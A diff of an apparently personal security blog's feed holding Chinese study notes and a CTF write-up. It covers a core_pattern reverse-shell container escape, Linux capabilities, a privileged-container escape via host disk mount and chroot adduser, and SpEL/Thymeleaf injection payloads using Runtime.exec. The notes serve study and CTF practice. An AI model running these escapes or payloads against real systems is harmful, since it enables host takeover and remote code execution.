+   pty.spawn(&quot;/bin/bash&quot;)
+   # os.remove('/tmp/.t.py')
+   s.close()
+if __name__ == &quot;__main__&quot;:
+   main()
+</code></pre>
+<p>给 Shell 赋予执行权限</p>
+<pre><code class="language-python">chmod 777 /tmp/t.py
+</code></pre>
+<p>写入反弹 shell 到目标的 proc 目录下</p>
+<pre><code class="language-python">echo -e &quot;|/var/lib/docker/overlay2/8b524daaa1e201d8e6706f9974fabbe7dfd6e7bd574508ae56278bee0d7d7c8b/merged/tmp/t.py \rcore    &quot; &gt;  /host/proc/sys/kernel/core_pattern
+</code></pre>
+<p>在攻击主机上开启一个监听，然后在容器里运行一个可以崩溃的程序</p>
+<pre><code class="language-c">vim t.c
+#include&lt;stdio.h&gt;
+int main(void)  {
+   int *a  = NULL;
+   *a = 1;
+   return 0;
+}
+gcc t.c -o t
+./t
+</code></pre>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[[Docker容器安全2]Linux Capabilities & 特权模式容器逃逸]]></title>
+        <id>https://skyblu3519.github.io/post/docker-rong-qi-an-quan-2linux-capabilities-and-te-quan-mo-shi-rong-qi-tao-yi/</id>
+        <link href="https://skyblu3519.github.io/post/docker-rong-qi-an-quan-2linux-capabilities-and-te-quan-mo-shi-rong-qi-tao-yi/">
+        </link>
+        <updated>2024-05-10T13:47:38.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="笔记">笔记</h1>
+<p>学习下Linux capabilities</p>
+<h2 id="概念">概念</h2>
+<p>Linux capabilities 将 root 权限划分为较小的、独立的单元，使进程可以拥有部分权限，以对 root 权限进行更细粒度的控制。</p>
+<h2 id="有哪些">有哪些？</h2>
+<table>
+<thead>
+<tr>
+<th>capability 名称</th>
+<th>描述</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>CAP_AUDIT_CONTROL</td>
+<td>启用和禁用内核审计；改变审计过滤规则；检索审计状态和过滤规则</td>
+</tr>
+<tr>
+<td>CAP_AUDIT_READ</td>
+<td>允许通过 multicast netlink 套接字读取审计日志</td>
+</tr>
+<tr>
+<td>CAP_AUDIT_WRITE</td>
+<td>将记录写入内核审计日志</td>
+</tr>
+<tr>
+<td>CAP_BLOCK_SUSPEND</td>
+<td>使用可以阻止系统挂起的特性</td>
+</tr>
+<tr>
+<td>CAP_CHOWN</td>
+<td>修改文件所有者的权限</td>
+</tr>
+<tr>
+<td>CAP_DAC_OVERRIDE</td>
+<td>忽略文件的 DAC 访问限制</td>
+</tr>
+<tr>
+<td>CAP_DAC_READ_SEARCH</td>
+<td>忽略文件读及目录搜索的 DAC 访问限制</td>
+</tr>
+<tr>
+<td>CAP_FOWNER</td>
+<td>忽略文件属主 ID 必须和进程用户 ID 相匹配的限制</td>
+</tr>
+<tr>
+<td>CAP_FSETID</td>
+<td>允许设置文件的 setuid 位</td>
+</tr>
+<tr>
+<td>CAP_IPC_LOCK</td>
+<td>允许锁定共享内存片段</td>
+</tr>
+<tr>
+<td>CAP_IPC_OWNER</td>
+<td>忽略 IPC 所有权检查</td>
+</tr>
+<tr>
+<td>CAP_KILL</td>
+<td>允许对不属于自己的进程发送信号</td>
+</tr>
+<tr>
+<td>CAP_LEASE</td>
+<td>允许修改文件锁的 FL_LEASE 标志</td>
+</tr>
+<tr>
+<td>CAP_LINUX_IMMUTABLE</td>
+<td>允许修改文件的 IMMUTABLE 和 APPEND 属性标志</td>
+</tr>
+<tr>
+<td>CAP_MAC_ADMIN</td>
+<td>允许 MAC 配置或状态更改</td>
+</tr>
+<tr>
+<td>CAP_MAC_OVERRIDE</td>
+<td>忽略文件的 DAC 访问限制</td>
+</tr>
+<tr>
+<td>CAP_MKNOD</td>
+<td>允许使用 mknod() 系统调用</td>
+</tr>
+<tr>
+<td>CAP_NET_ADMIN</td>
+<td>允许执行网络管理任务</td>
+</tr>
+<tr>
+<td>CAP_NET_BIND_SERVICE</td>
+<td>允许绑定到小于 1024 的端口</td>
+</tr>
+<tr>
+<td>CAP_NET_BROADCAST</td>
+<td>允许网络广播和多播访问</td>
+</tr>
+<tr>
+<td>CAP_NET_RAW</td>
+<td>允许使用原始套接字</td>
+</tr>
+<tr>
+<td>CAP_SETGID</td>
+<td>允许改变进程的 GID</td>
+</tr>
+<tr>
+<td>CAP_SETFCAP</td>
+<td>允许为文件设置任意的 capabilities</td>
+</tr>
+<tr>
+<td>CAP_SETPCAP</td>
+<td>参考 capabilities man page</td>
+</tr>
+<tr>
+<td>CAP_SETUID</td>
+<td>允许改变进程的 UID</td>
+</tr>
+<tr>
+<td>CAP_SYS_ADMIN</td>
+<td>允许执行系统管理任务，如加载或卸载文件系统、设置磁盘配额等</td>
+</tr>
+<tr>
+<td>CAP_SYS_BOOT</td>
+<td>允许重新启动系统</td>
+</tr>
+<tr>
+<td>CAP_SYS_CHROOT</td>
+<td>允许使用 chroot() 系统调用</td>
+</tr>
+<tr>
+<td>CAP_SYS_MODULE</td>
+<td>允许插入和删除内核模块</td>
+</tr>
+<tr>
+<td>CAP_SYS_NICE</td>
+<td>允许提升优先级及设置其他进程的优先级</td>
+</tr>
+<tr>
+<td>CAP_SYS_PACCT</td>
+<td>允许执行进程的 BSD 式审计</td>
+</tr>
+<tr>
+<td>CAP_SYS_PTRACE</td>
+<td>允许跟踪任何进程</td>
+</tr>
+<tr>
+<td>CAP_SYS_RAWIO</td>
+<td>允许直接访问 /devport、/dev/mem、/dev/kmem 及原始块设备</td>
+</tr>
+<tr>
+<td>CAP_SYS_RESOURCE</td>
+<td>忽略资源限制</td>
+</tr>
+<tr>
+<td>CAP_SYS_TIME</td>
+<td>允许改变系统时钟</td>
+</tr>
+<tr>
+<td>CAP_SYS_TTY_CONFIG</td>
+<td>允许配置 TTY 设备</td>
+</tr>
+<tr>
+<td>CAP_SYSLOG</td>
+<td>允许使用 syslog() 系统调用</td>
+</tr>
+<tr>
+<td>CAP_WAKE_ALARM</td>
+<td>允许触发一些能唤醒系统的东西(比如 CLOCK_BOOTTIME_ALARM 计时器)</td>
+</tr>
+</tbody>
+</table>
+<h2 id="capabilities-集合">capabilities 集合</h2>
+<p>Linux capabilities 分为进程（Processes） capabilities 和文件（Binaries） capabilities。</p>
+<h3 id="进程processes-capabilities">进程（Processes） capabilities</h3>
+<p>每一个线程，具有 5 个 capabilities 集合，每一个集合使用 64 位掩码来表示，显示为 16 进制格式。这 5 个 capabilities 集合分别是：</p>
+<ul>
+<li><strong>Permitted</strong></li>
+<li><strong>Effective</strong></li>
+<li><strong>Inheritable</strong></li>
+<li><strong>Bounding</strong></li>
+<li><strong>Ambient</strong></li>
+</ul>
+<p>每个集合中都包含零个或多个 capabilities。这5个集合的具体含义如下：</p>
+<p><strong>Inherited (CapInh):</strong></p>
+<ul>
+<li>目的：确定从父进程传递下来的 <code>capabilities</code>。</li>
+<li>功能：当创建（<code>exec()</code>）一个新进程时，它会从父进程继承这个集合中的 <code>capabilities</code>。不会添加到新线程的 <code>Effective</code> 集合中，它只会影响新线程的 <code>Permitted</code> 集合。</li>
+</ul>
+<p><strong>Effective (CapEff):</strong></p>
+<ul>
+<li>目的：表示进程在任何时刻实际使用的 <code>capabilities</code>。</li>
+<li>功能：是内核检查各种操作权限时使用的<code>capabilities</code>集合。</li>
+</ul>
+<p><strong>Permitted (CapPrm)：</strong></p>
+<ul>
+<li>目的：定义进程可以拥有的最大<code>capabilities</code>集合。</li>
+<li>功能：线程可以从 <code>Effective</code> 或 <code>Inheritable</code> 集合中添加或删除 <code>capability</code>，前提是添加或删除的 <code>capability</code> 必须包含在 <code>Permitted</code> 集合中。</li>
+</ul>
+<p><strong>Bounding (CapBnd):</strong></p>
+<ul>
+<li>目的：限制进程在其生命周期内可获得的<code>capabilities</code>能力集合。</li>
+<li>功能：即使某个<code>capabilities</code>在进程的<code>Inheritable</code>或<code>Permitted</code>集合中，它也不能获得该<code>capabilities</code>，除非它也在<code>Bounding</code>集合中。</li>
+</ul>
+<p><strong>Ambient (CapAmb):</strong></p>
+<ul>
+<li>Linux 4.3 内核新增了一个 capabilities 集合叫 Ambient ，用来弥补 Inheritable 的不足。Ambient 具有如下特性：
+<ul>
+<li><code>Permitted</code> 和 <code>Inheritable</code> 未设置的 <code>capabilities</code>，<code>Ambient</code> 也不能设置。</li>
+<li>当 <code>Permitted</code> 和 <code>Inheritable</code> 关闭某权限（比如 <code>CAP_SYS_BOOT</code>）后，<code>Ambient</code> 也随之关闭对应权限。这样就确保了降低权限后子进程也会降低权限。</li>
+<li>非特权用户如果在 <code>Permitted</code> 集合中有一个 <code>capability</code>，那么可以添加到 <code>Ambient</code> 集合中，这样它的子进程便可以在 <code>Ambient</code>、<code>Permitted</code> 和 <code>Effective</code> 集合中获取这个 <code>capability</code></li>
+<li>有点抽象，在具体的使用场景感受</li>
+</ul>
+</li>
+</ul>
+<h3 id="文件binaries-capabilities">文件（Binaries） capabilities</h3>
+<p>文件的 capabilities 功能，需要文件系统的支持。如果文件系统使用了 nouuid 选项进行挂载，那么文件的 capabilities 将会被忽略。</p>
+<p>类似于线程的 capabilities，文件的 capabilities 包含了 3 个集合：</p>
+<ul>
+<li>Permitted</li>
+<li>Inheritable</li>
+<li>Effective</li>
+</ul>
+<p>和线程 capabilities 有较大差异的是<code>Effective</code>集合：</p>
+<p><strong>Effective</strong><br>
+这不是一个集合，仅仅是一个标志位。如果设置开启，那么在执行完 <code>execve()</code> 后，线程 <code>Permitted</code> 集合中的 <code>capabilities</code> 会自动添加到它的 Effective 集合中。对于一些旧的可执行文件，由于其不会调用 capabilities 相关函数设置自身的 <code>Effective</code> 集合，所以可以将可执行文件的 Effective bit 开启，从而可以将 <code>Permitted</code> 集合中的 capabilities 自动添加到 <code>Effective</code> 集合中。</p>
+<h2 id="公式运行-execve-后-capabilities-的变化">公式：运行 execve() 后 capabilities 的变化</h2>
+<p>我们用 <code>P</code> 代表<strong>执行 execve() 前线程的 capabilities</strong>，<code>P'</code> 代表<strong>执行 execve() 后线程的 capabilities</strong>，<code>F</code> 代表<strong>可执行文件的 capabilities</strong>。那么：</p>
+<pre><code>P’(ambient) = (file is privileged) ? 0 : P(ambient)
+
+P’(permitted) = (P(inheritable) &amp; F(inheritable)) |
+                (F(permitted) &amp; P(bounding))) | 
+                P’(ambient)
+
+P’(effective)   = F(effective) ? P’(permitted) : P’(ambient)
+
+P’(inheritable) = P(inheritable) [i.e., unchanged]
+
+P’(bounding) = P(bounding) [i.e., unchanged]
+</code></pre>
+<p>注：</p>
+<ul>
+<li>上面的公式是针对系统调用 <code>execve()</code> 的，如果是 <code>fork()</code>，那么子线程的 capabilities 信息完全复制父进程的 capabilities 信息。</li>
+</ul>
+<h2 id="capabilities-操作">capabilities 操作</h2>
+<h3 id="查看-capabilities">查看 capabilities</h3>
+<p>相关工具：<code>libcap-ng</code></p>
+<p>安装（Centos）：<code>yum install libcap-ng-utils</code></p>
+<p>使用<code>/proc/&lt;pid&gt;/status</code>查看进程capabilities</p>
+<pre><code class="language-shell">cat /proc/1234/status | grep Cap
+cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
+</code></pre>
+<p>通常有5行</p>
+<pre><code>CapInh:	0000000000000000
+CapPrm:	0000001fffffffff
+CapEff:	0000001fffffffff
+CapBnd:	0000001fffffffff
+CapAmb:	0000000000000000
+</code></pre>
+<p>使用<code>capsh</code>解码让其可读</p>
+<pre><code># capsh --decode=0000003fffffffff
+0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,35,36,37
+</code></pre>
+<p>使用 getpcaps 工具</p>
+<pre><code># ping baidu.com &gt; /dev/null&amp;
+[1] 9227
+# getpcaps 9227
+Capabilities for `9227': = cap_net_admin,cap_net_raw+p
+# cat /proc/9227/status | grep Cap
+CapInh:	0000000000000000
+CapPrm:	0000000000003000
+CapEff:	0000000000000000
+CapBnd:	0000001fffffffff
+CapAmb:	0000000000000000
+# capsh --decode=0000000000003000
+0x0000000000003000=cap_net_admin,cap_net_raw
+</code></pre>
+<p>注意到这里启动的 ping 它的 CapEff 是 0，这点后面会提（应该）</p>
+<p>文件capabilities查看</p>
+<pre><code>getcap /usr/bin/ping
+/usr/bin/ping = cap_net_admin,cap_net_raw+p
+
+###
+capability[,capability…]+(e|i|p)，其中 e 表示 effective，i 表示 inheritable，p 表示 permitted。不同的分组之间通过空格隔开，例如：Current: = cap_sys_chroot+ep cap_net_bind_service+eip。再举一个例子，cap_net_bind_service+e cap_net_bind_service+ip 和 cap_net_bind_service+eip 等价。
+</code></pre>
+<p>遍历目录下所有可执行文件的capabilities（<code>2&gt;/dev/null</code> 则是将错误输出重定向到 <code>/dev/null</code>，即忽略错误消息）</p>
+<pre><code># getcap -r / 2&gt;/dev/null
+/usr/sbin/arping = cap_net_raw+p
+/usr/sbin/clockdiff = cap_net_raw+p
+/usr/sbin/suexec = cap_setgid,cap_setuid+ep
+/usr/bin/ping = cap_net_admin,cap_net_raw+p
+/usr/bin/newuidmap = cap_setuid+ep
+/usr/bin/newgidmap = cap_setgid+ep
+</code></pre>
+<h3 id="使用capsh设置的新shell">使用capsh设置的新shell</h3>
+<p>使用 capsh 工具在运行 ping 之前移除 CAP_NET_RAW capabilities，并输出当前权限设置。</p>
+<pre><code># capsh --drop=cap_net_raw --print -- -c &quot;ping baidu.com&quot;
+Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,35,36+ep
+Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,35,36
+Securebits: 00/0x0/1'b0
+ secure-noroot: no (unlocked)
+ secure-no-suid-fixup: no (unlocked)
+ secure-keep-caps: no (unlocked)
+uid=0(root)
+gid=0(root)
+groups=0(root),994(docker)
+ping: socket: 不允许的操作
+</code></pre>
+<h3 id="使用setcap设置文件的capabilities">使用setcap设置文件的capabilities</h3>
+<p>设置新的限制</p>
+<pre><code>setcap cap_net_admin+p /usr/bin/ping
+</code></pre>
+<p>也可以清空capabilities</p>
+<pre><code>setcap -r &lt;/path/to/binary&gt;
+</code></pre>
+<h2 id="具有-capabilities-感知能力的文件">具有 capabilities 感知能力的文件</h2>
+<p>这部分的内容开始看的时候有点难理解，之后在HackTrick找了段英文的解释</p>
+<blockquote>
+<p>The capability-aware binaries won't use the new capabilities given by the environment, however the capability dumb binaries will use them as they won't reject them. This makes capability-dumb binaries vulnerable inside a special environment that grant capabilities to binaries.</p>
+</blockquote>
+<p><strong>Capability-aware Binaries（具有能力感知的二进制文件）：</strong></p>
+<ul>
+<li>这些二进制文件是设计和编写时考虑到 Linux capabilities 的。因此，它们会显式地检查和管理它们需要的 capabilities。</li>
+<li>当这些二进制文件在具有额外 capabilities 的环境中运行时，它们不会自动使用这些新授予的 capabilities。相反，它们会检查当前的 capabilities 设置，并决定是否使用这些权限。</li>
+</ul>
+<p><strong>Capability-dumb Binaries（不具备能力感知的二进制文件）：</strong></p>
+<ul>
+<li>这些二进制文件在编写时没有考虑 Linux capabilities，它们对这些权限的存在或不存在不敏感。</li>
+<li>当这些二进制文件在具有额外 capabilities 的环境中运行时，它们不会主动拒绝这些新授予的 capabilities。因此，它们会自动拥有并使用这些权限。</li>
+</ul>
+<p>结合文章<code>ping</code>命令的实验就好理解了：<a href="https://icloudnative.io/posts/linux-capabilities-in-practice-2/">https://icloudnative.io/posts/linux-capabilities-in-practice-2/</a></p>
+<h1 id="privileged-特权模式容器逃逸">Privileged 特权模式容器逃逸</h1>
+<p>当使用--privileged=true选项运行容器时，Docker会赋予容器几乎与主机相同的权限4。具体来说，这个选项做了以下两件事情：</p>
+<ul>
+<li>给容器添加了所有的capabilities</li>
+<li>允许容器访问主机的所有设备</li>
+</ul>
+<pre><code class="language-shell">docker run --privileged=true -it ubuntu
+</code></pre>
+<p>在容器内部执行下面的命令，从而判断容器是不是特权模式，如果是以特权模式启动的话，CapEff 对应的掩码值应该为0000003fffffffff 或者是 0000001fffffffff</p>
+<pre><code class="language-shell">cat /proc/$$/status | grep CapEff
+</code></pre>
+<p>查看挂载磁盘设备</p>
+<pre><code class="language-shell">fdisk -l
+Disk /dev/vda: 40 GiB, 42949672960 bytes, 83886080 sectors
+Units: sectors of 1 * 512 = 512 bytes
+Sector size (logical/physical): 512 bytes / 512 bytes
+I/O size (minimum/optimal): 512 bytes / 512 bytes
+Disklabel type: dos
+Disk identifier: 0x000beb6e
+
+Device     Boot Start      End  Sectors Size Id Type
+/dev/vda1  *     2048 83886046 83883999  40G 83 Linux
+</code></pre>
+<p>在容器内部执行以下命令，将宿主机文件挂载到 /test 目录下</p>
+<pre><code class="language-shell">mkdir /test &amp;&amp; mount /dev/vda1 /test
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/1715348908477.png" alt="" loading="lazy"></figure>
+<p>方法一：写计划任务</p>
+<p>方法二：</p>
+<pre><code class="language-shell">chroot /mnt adduser john
+</code></pre>
+<h1 id="参考">参考</h1>
+<p><a href="https://icloudnative.io/posts/linux-capabilities-why-they-exist-and-how-they-work/">Linux Capabilities 入门教程：概念篇</a><br>
+<a href="https://icloudnative.io/posts/linux-capabilities-in-practice-1/">Linux Capabilities 入门教程：基础实战篇</a><br>
+<a href="https://icloudnative.io/posts/linux-capabilities-in-practice-2/">Linux Capabilities 入门教程：进阶实战篇</a><br>
+<a href="https://book.hacktricks.xyz/linux-hardening/privilege-escalation/linux-capabilities">HackTricks - Linux Capabilities</a><br>
+<a href="https://blog.csdn.net/Dontla/article/details/132996095">docker run：--privileged=true选项解析（特权模式：赋予容器几乎与主机相同的权限）-CSDN博客</a><br>
+<a href="https://wiki.teamssix.com/cloudnative/docker/docker-privileged-escape.html">Privileged 特权模式容器逃逸</a></p>
+]]></content>
+    </entry>
+    <entry>
+        <title type="html"><![CDATA[SpEL补充]]></title>
+        <id>https://skyblu3519.github.io/post/spel-bu-chong/</id>
+        <link href="https://skyblu3519.github.io/post/spel-bu-chong/">
+        </link>
+        <updated>2024-05-04T16:04:02.000Z</updated>
+        <content type="html"><![CDATA[<h1 id="什么是el">什么是EL？</h1>
+<p>表达式语言（Expression Language，简称EL）是一种专门用于在应用程序中访问数据和函数的轻量级编程语言，通常用于Web应用程序中。它最初是为了简化在JavaServer Pages (JSP) 中的页面编码而设计的，但其使用已经扩展到其他技术领域。</p>
+<h1 id="什么是spel">什么是SpEL？</h1>
+<p>SpEL(Spring Expression Language)是Spring框架中的一个强大的表达式语言，它扩展了标准EL的概念。SpEL支持更复杂的表达式如方法调用、字符串模板表达式、数组创建、列表选择、映射访问等。</p>
+<p>SpEL与传统的EL相比，提供了更加丰富的功能集，可以在更广泛的Spring项目中使用，如安全性表达式、数据绑定、条件表达式等。SpEL不仅仅限于Web环境，也可用于任何需要动态表达式计算的Spring应用程序中。</p>
+<h1 id="spel用法示例">SpEL用法示例</h1>
+<p>使用示例参考文档：<a href="https://docs.spring.io/spring-framework/docs/3.0.x/reference/expressions.html">https://docs.spring.io/spring-framework/docs/3.0.x/reference/expressions.html</a></p>
+<p>SpEL支持以下功能：</p>
+<ul>
+<li>字面表达式</li>
+<li>布尔和关系运算符</li>
+<li>正则表达式</li>
+<li>类表达式</li>
+<li>访问属性、数组、列表和映射</li>
+<li>方法调用</li>
+<li>关系运算符</li>
+<li>调用构造函数</li>
+<li>bean引用</li>
+<li>数组构造</li>
+<li>内联的list</li>
+<li>内联的map</li>
+<li>三元运算符</li>
+<li>变量</li>
+<li>用户自定义函数</li>
+<li>集合选择</li>
+<li>模板化表达式</li>
+</ul>
+<p>解析字符串</p>
+<pre><code class="language-java">ExpressionParser parser = new SpelExpressionParser();
+Expression exp = parser.parseExpression(&quot;'Hello World'&quot;);
+String message = (String) exp.getValue();
+</code></pre>
+<p>调用方法</p>
+<pre><code class="language-java">Expression exp = parser.parseExpression(&quot;'Hello World'.concat('!')&quot;);
+String message = (String) exp.getValue();
+</code></pre>
+<p>访问属性</p>
+<pre><code class="language-java">Expression exp = parser.parseExpression(&quot;'Hello World'.bytes&quot;);
+byte[] bytes = (byte[]) exp.getValue();
+</code></pre>
+<p>使用构造函数</p>
+<pre><code class="language-java">Expression exp = parser.parseExpression(&quot;new String('hello world').toUpperCase()&quot;);
+String message = exp.getValue(String.class);
+</code></pre>
+<p>针对一个特定的对象实例（称为root object）提供被解析的表达式字符串</p>
+<pre><code class="language-java">User user = new User(&quot;skky&quot;, &quot;123456&quot;);
+Expression objExp = parser.parseExpression(&quot;name&quot;);
+
+EvaluationContext context = new StandardEvaluationContext(user);
+String name = (String) objExp.getValue(context);
+</code></pre>
+<p><code>T</code>操作符用于访问指定的类及其静态方法和静态属性，用来获取<strong>java.lang.Runtime</strong>下的<code>getRuntime()</code>也是SpEL注入主要的利用方式</p>
+<pre><code class="language-java">ExpressionParser parser = new SpelExpressionParser();
+Expression exp = parser.parseExpression(&quot;T(java.lang.Runtime).getRuntime().exec('open /System/Applications/Calculator.app')&quot;);
+String message = (String) exp.getValue();
+</code></pre>
+<p>关于<code>T</code>操作符文档中有个比较有意思的内容</p>
+<blockquote>
+<p>The StandardEvaluationContext uses a TypeLocator to find types and the StandardTypeLocator (which can be replaced) is built with an understanding of the java.lang package. This means T() references to types within java.lang do not need to be fully qualified, but all other type references must be.</p>
+</blockquote>
+<p>这里提到的<code>TypeLocator</code>和<code>StandardTypeLocator</code>：</p>
+<ul>
+<li><code>TypeLocator</code>：这是一个接口，SpEL使用它来查找类型。<code>StandardEvaluationContext</code>使用这个接口的实现来确定如何找到表达式中引用的类型。</li>
+<li><code>StandardTypeLocator</code>：这是<code>TypeLocator</code>的一个标准实现，默认情况下它了解<code>java.lang</code>包。因此，对于<code>java.lang</code>包中的类，你不需要提供完整的包名。例如，<code>T(String)</code>已经足够引用<code>java.lang.String</code>类。但是对于非j<code>ava.lang</code>包中的其他类，你必须使用完整的类名，如<code>T(com.example.MyClass)</code>。</li>
+</ul>
+<p>参考的使用方式是用来方便地解析和引用类。比如有下面这个类</p>
+<pre><code class="language-java">package com.examples;
+
+public class Utility {
+    public static String getGreeting() {
+        return &quot;Hello, World!&quot;;
+    }
+}
+</code></pre>
+<p>使用<code>StandardTypeLocator</code>来简化查找</p>
+<pre><code class="language-java">StandardEvaluationContext context_example = new StandardEvaluationContext();
+
+// 使用StandardTypeLocator并添加一个新的包前缀
+StandardTypeLocator typeLocator = new StandardTypeLocator();
+typeLocator.registerImport(&quot;com.examples&quot;);
+
+context_example.setTypeLocator(typeLocator);
+
+// 现在可以不使用全路径来调用getGreeting()方法
+String greeting = parser.parseExpression(&quot;T(Utility).getGreeting()&quot;).getValue(context_example, String.class);
+</code></pre>
+<p>那么这个<code>StandardTypeLocator</code>可不可以用来限制一些类的查找呢？</p>
+<p>答案是可以的，我们可以继承<code>StandardTypeLocator</code>然后重写它的<code>findType</code>方法来增加查找类的限制</p>
+<pre><code class="language-java">import org.springframework.expression.EvaluationException;
+import org.springframework.expression.Expression;
+import org.springframework.expression.ExpressionParser;
+import org.springframework.expression.spel.standard.SpelExpressionParser;
+import org.springframework.expression.spel.support.StandardEvaluationContext;
+import org.springframework.expression.spel.support.StandardTypeLocator;
+
+
+public class exploit {
+    public static void main(String[] args) {
+        ExpressionParser parser = new SpelExpressionParser();
+        StandardEvaluationContext context = new StandardEvaluationContext();
+        context.setTypeLocator(new RestrictedTypeLocator());
+
+        Expression exp = parser.parseExpression(&quot;T(java.lang.Runtime).getRuntime().exec('open /System/Applications/Calculator.app')&quot;);
+        String message = (String) exp.getValue(context);
+    }
+}
+
+
+class RestrictedTypeLocator extends StandardTypeLocator {
+    public RestrictedTypeLocator() {
+        super();
+    }
+
+    @Override
+    public Class&lt;?&gt; findType(String typeName) throws EvaluationException {
+        if (typeName.startsWith(&quot;java.lang.Runtime&quot;)) {
+            throw new EvaluationException(&quot;Access denied for type: &quot; + typeName);
+        } else {
+            return super.findType(typeName);
+        }
+    }
+}
+</code></pre>
+<figure data-type="image" tabindex="1"><img src="https://skyblu3519.github.io/post-images/spel_re/1714828150238-d60d5fc8-1634-4843-b911-73bc62960c95.png" alt="image.png" loading="lazy"></figure>
+<p>另外关于<code>StandardEvaluationContext</code>还有一个设置解析前后缀的用法，具体参考P神的javacon，这里就不赘述了。</p>
+<h1 id="thymeleaf与spel">Thymeleaf与SpEL</h1>
+<p>Thymeleaf 是一个Java 模板引擎，它使用的模版语法是其自己实现的，叫_Standard_。它的语法格式有下面几种</p>
+<ul>
+<li><code>${...}</code>: Variable expressions.</li>
+<li><code>*{...}</code>: Selection expressions.</li>
+<li><code>#{...}</code>: Message (i18n) expressions.</li>
+<li><code>@{...}</code>: Link (URL) expressions.</li>
+<li><code>~{...}</code>: Fragment expressions.</li>
+<li><code>__...__</code>:  Expression preprocessing.</li>
+</ul>
+<p>除了学习模版注入的后两种（Fragment expressions, Expression preprocessing），前两种(Variable expressions, Selection expressions)也是值得注意的</p>
+<blockquote>
+<p>Variable expressions are OGNL expressions –or Spring EL if you’re integrating Thymeleaf with Spring– executed on the <em>context variables</em> — also called <em>model attributes</em> in Spring jargon.</p>
+<p>Selection expressions are just like variable expressions, except they will be executed on a previously selected object instead of the whole context variables map.</p>
+</blockquote>
+<p>这里面的内容Thymeleaf会根据当前的环境，将其当作Spring EL或OGNL来解析。</p>
+<p>所以前面看的Thymeleaf模版注入，其实就是用在解析模版名称的时候，在模板名称中注入了一个预处理表达式，这个预处理表达式包裹的是一个变量表达式，这个变量表达式就可以用来执行任意的SpEL表达式。</p>
+<p>另外之前看到的在下面这种可以完全控制解析的模版名称的情景</p>
+<pre><code class="language-java">@GetMapping(&quot;/path&quot;)
+public String path(@RequestParam String lang) {
+    return lang; // template path is tainted
+}
+</code></pre>
+<p>这里不走解析预处理表达式（不使用<code>_</code>的情况）也是可以的</p>
+<pre><code>${T(java.lang.Runtime).getRuntime().exec('open /System/Applications/Calculator.app')}::x
+</code></pre>
+<p>使用<code>::</code>进入片段表达式的解析逻辑，由于没有预处理表达式，传入的模版名称被<code>~{...}</code>包裹后直接作为片段表达式解析返回<br>
+<img src="https://skyblu3519.github.io/post-images/spel_re/1714831173471-bf69b695-c458-46d8-a5cd-dcbc4e9f6166.png" alt="image.png" loading="lazy"></p>
+<p>构造的变量表达式被解析成了<code>templateName</code>，接着在后面的<code>FragmentExpression.createExecutedFragmentExpression(context, fragmentExpression);</code>可以清楚的看到其作为变量表达式被解析的代码<br>
+<img src="https://skyblu3519.github.io/post-images/spel_re/1714831375949-fd272a78-da73-41bb-88b6-fd5a51f804b3.png" alt="image.png" loading="lazy"></p>
+<h1 id="2024红明谷simp1escape">2024红明谷｜Simp1escape</h1>
+<p><code>/curl</code>路由存在SSRF，可以使用302跳转绕过。这里记一下它的处理逻辑，下次看到就可以用了</p>
+<pre><code class="language-java">InetAddress inetAddress = InetAddress.getByName(hostname);
+if (Utils.isPrivateIp(inetAddress)) {
+    return &quot;Illegal ip address&quot;;
+} else {
+    try {
+        // ......
+        TimeUnit.SECONDS.sleep(4L);
+        HttpURLConnection connection = (HttpURLConnection)urlObject.openConnection();
+        if (connection instanceof HttpURLConnection) {
+            connection.connec
+            // ......
+</code></pre>
+<p>用这个SSRF攻击<code>/getsites</code></p>
+<pre><code class="language-java">@GetMapping({&quot;/getsites&quot;})
+public String admin(@RequestParam String hostname, HttpServletRequest request, HttpServletResponse response) throws Exception {
+    String ipAddress = request.getRemoteAddr();
+    if (!ipAddress.equals(&quot;127.0.0.1&quot;)) {
+        response.setStatus(HttpStatus.FORBIDDEN.value());
+        return &quot;forbidden&quot;;
+    } else {
+        Context context = new Context();
+        TemplateEngine engine = new SpringTemplateEngine();
+        String dispaly = engine.process(hostname, context);
+        return dispaly;
+    }
+}
+</code></pre>
+<p><code>SpringTemplateEngine.process</code>是用的父类<code>org.thymeleaf.TemplateEngine</code>实现的，根据<a href="https://www.thymeleaf.org/apidocs/thymeleaf/3.0.0.BETA02/org/thymeleaf/TemplateEngine.html#process-java.lang.String-org.thymeleaf.context.IContext-">API文档</a>的描述，<code>process</code>就是将传入template当作模版内容来处理的<br>
